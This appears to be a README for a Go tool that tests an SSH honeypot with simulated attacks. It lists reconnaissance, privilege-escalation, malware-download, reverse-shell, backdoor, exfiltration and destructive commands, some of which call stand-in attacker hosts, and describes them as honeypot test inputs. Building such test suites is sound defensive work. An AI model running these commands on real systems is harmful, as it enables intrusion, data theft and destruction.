# SSH Protocol Test Commands

## New SSH Protocol Tests Added ✨

The Go tester now includes comprehensive SSH protocol testing beyond just command execution.

## Test Categories

### 1. SSH Protocol Tests
Tests the SSH protocol implementation itself:
- ✅ **SSH version detection** - Identifies server version (SSH-2.0)
- ✅ **Authentication methods** - Tests password, keyboard-interactive, public key
- ✅ **Server banner** - Captures server identification string
- ✅ **Protocol compliance** - Verifies SSH-2.0 compliance

### 2. Multiple Concurrent Sessions
Simulates real-world attack patterns:
- ✅ **3 simultaneous connections** - Tests connection limits
- ✅ **Concurrent command execution** - Runs commands on each session
- ✅ **Session isolation** - Verifies sessions don't interfere
- ✅ **Resource exhaustion** - Tests honeypot stability

### 3. Key Exchange & Environment
Advanced SSH protocol features:
- ✅ **Key exchange completion** - Tests cryptographic handshake
- ✅ **Environment variables** - LANG, PATH, TERM injection attempts
- ✅ **PTY allocation** - Pseudo-terminal requests
- ✅ **X11 forwarding** - Graphical forwarding attempts (should be denied)
- ✅ **SSH agent forwarding** - Agent requests (should be denied)
- ✅ **Port forwarding** - Local (-L), Remote (-R), and SOCKS (-D) attempts

### 4. Enhanced Command Execution (60+ commands)

#### Basic Reconnaissance (6 commands)
```bash
ls, ls -la
pwd
whoami
id
groups
```

#### System Information (6 commands)
```bash
uname -a
cat /etc/os-release
hostname
uptime
df -h
free -m
```

#### Process & Network Enumeration (10 commands)
```bash
ps aux, ps -ef
netstat -tulpn
ss -tulpn
ifconfig, ip addr
ip route
arp -a
```

#### File System Exploration (11 commands)
```bash
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
cat /etc/hostname
cat /home/user/secret.txt
cat /home/user/.bashrc
cat /home/user/.bash_history
find / -name "*.conf"
find / -type f -perm -4000  # SUID files
find /home -name "*.txt"
```

#### Privilege Escalation (4 commands)
```bash
sudo -l
sudo su
su root
cat /etc/sudoers
```

#### Malware Download (4 commands)
```bash
curl http://malicious.com/payload.sh
wget http://evil.com/backdoor.sh
wget -O /tmp/shell.sh http://attacker.com/reverse.sh
curl -o /tmp/bot http://badguys.net/cryptominer
```

#### Malicious Execution (6 commands)
```bash
chmod +x malware.sh
chmod 777 /tmp
./malware.sh
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # Reverse shell
nc -e /bin/sh attacker.com 4444          # Netcat backdoor
python -c 'import socket...'              # Python reverse shell
```

#### Persistence Mechanisms (4 commands)
```bash
crontab -l
echo '* * * * * /tmp/backdoor.sh' | crontab -  # Cron backdoor
cat ~/.ssh/authorized_keys
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys  # SSH key backdoor
```

#### Data Exfiltration (3 commands)
```bash
tar -czf /tmp/data.tar.gz /home/user
zip -r /tmp/secrets.zip /home/user/Documents
curl -X POST -d @/etc/passwd http://attacker.com/upload
```

#### Destructive Commands (4 commands)
```bash
rm -rf /
rm -rf /*
dd if=/dev/zero of=/dev/sda  # Disk wipe
:(){:|:&};:                    # Fork bomb
```

#### System Manipulation (5 commands)
```bash
iptables -F
systemctl stop firewalld
pkill -9 sshd
history -c
unset HISTFILE
```

## Test Execution Order

```
1. SSH PROTOCOL TESTS
   └─ Version detection, auth methods

2. SSH BRUTE FORCE ATTACK (if enabled)
   └─ 5 password attempts

3. SSH VALID LOGIN TEST
   └─ Authenticate with fake credentials

4. SSH COMMAND EXECUTION
   └─ 60+ malicious commands

5. SSH MULTIPLE CONCURRENT SESSIONS
   └─ 3 simultaneous connections

6. SSH KEY EXCHANGE & ENVIRONMENT
   └─ Protocol-level tests
```

## Usage

### Run All SSH Tests
```bash
./tester --ssh-only \
         --ssh-user root \
         --ssh-pass toor
```

### Run Without Brute Force (Faster)
```bash
./tester --ssh-only \
         --no-bruteforce \
         --ssh-user root \
         --ssh-pass toor
```

### Against Docker
```bash
./tester --ssh-only \
         --ssh-host localhost \
         --ssh-port 2222 \
         --ssh-user root \
         --ssh-pass toor
```

## Expected Output

```
============================================================
SSH PROTOCOL TESTS
============================================================

✓ SSH protocol version detection
  SSH-2.0 server detected
✓ Test Password authentication
  Method: password
✓ Test Keyboard-interactive
  Method: keyboard-interactive
✓ Test Public key authentication
  Method: publickey

============================================================
SSH BRUTE FORCE ATTACK
============================================================

✓ Attempt 1: admin/password
  Failed as expected
✓ Attempt 2: admin/123456
  Failed as expected
...

============================================================
SSH VALID LOGIN TEST
============================================================

✓ Login successful: root/toor
  Connected to honeypot

============================================================
SSH COMMAND EXECUTION (root)
============================================================

✓ List files
  Command: ls
    Output: total 48...
✓ List all files with details
  Command: ls -la
    Output: drwxr-xr-x...
✓ Read passwd file
  Command: cat /etc/passwd
    Output: root:x:0:0...
...

============================================================
SSH MULTIPLE CONCURRENT SESSIONS
============================================================

✓ Session 1 established
  Concurrent connection successful
✓ Session 2 established
  Concurrent connection successful
✓ Session 3 established
  Concurrent connection successful
✓ Session 1 command
  Output: root
✓ Session 2 command
  Output: root
✓ Session 3 command
  Output: root

============================================================
SSH KEY EXCHANGE & ENVIRONMENT
============================================================

✓ Key exchange test
  Server completed key exchange
✓ Environment variable injection
  Testing LANG, PATH, TERM variables
✓ PTY allocation request
  Pseudo-terminal request sent
✓ X11 forwarding attempt
  X11 forwarding request (should be denied)
✓ SSH agent forwarding
  Agent forwarding request (should be denied)
✓ Local port forwarding
  Port forward -L 8080:localhost:80
✓ Remote port forwarding
  Port forward -R 9090:localhost:22
✓ Dynamic SOCKS proxy
  SOCKS proxy -D 1080
```

## Dashboard View

After running tests, check the dashboard:

**SSH Tab → Command Execution History:**
```
IP ADDRESS       USERNAME    COMMAND                         TIMESTAMP
127.0.0.1        root        ls                              12/20/2025, 12:15 PM
127.0.0.1        root        cat /etc/passwd                 12/20/2025, 12:15 PM
127.0.0.1        root        wget http://evil.com/...        12/20/2025, 12:15 PM
127.0.0.1        root        bash -i >& /dev/tcp/...         12/20/2025, 12:15 PM
127.0.0.1        root        rm -rf /                        12/20/2025, 12:16 PM
```

All commands now properly show:
- ✅ IP address of attacker
- ✅ Username used
- ✅ Full command executed
- ✅ Timestamp

## Attack Patterns Detected

The honeypot can now identify:
- **Reconnaissance** - System enumeration commands
- **Privilege Escalation** - sudo, su attempts
- **Malware Download** - wget, curl to suspicious URLs
- **Backdoor Installation** - cron jobs, SSH keys
- **Data Exfiltration** - tar, zip, curl uploads
- **Destructive Actions** - rm -rf, dd commands
- **Persistence** - Cron, SSH authorized_keys
- **Network Tunneling** - Port forwarding attempts

## Performance

### Timing (with all tests)
- SSH Protocol Tests: ~2 seconds
- Brute Force (5 attempts): ~3 seconds
- Valid Login: ~1 second
- Command Execution (60 commands): ~20 seconds
- Multiple Sessions: ~3 seconds
- Key Exchange Tests: ~2 seconds

**Total SSH Testing Time**: ~30 seconds

### With --no-bruteforce
**Total**: ~25 seconds

## Security Note

⚠️ **These are simulated attacks**. All commands are executed in the fake honeypot shell:
- No actual system damage occurs
- All responses are simulated
- Real malware is not downloaded
- No actual reverse shells are created

The honeypot logs everything for analysis without executing real malicious code.

## Comparison

### Before (20 commands)
- Basic file operations
- Simple reconnaissance
- Limited attack simulation

### After (60+ commands + protocol tests)
- ✅ Full attack lifecycle simulation
- ✅ SSH protocol testing
- ✅ Concurrent session handling
- ✅ Advanced persistence techniques
- ✅ Data exfiltration simulation
- ✅ Destructive command attempts
- ✅ Network tunneling tests

---

**Total Attack Patterns**: 70+ distinct SSH attack patterns!
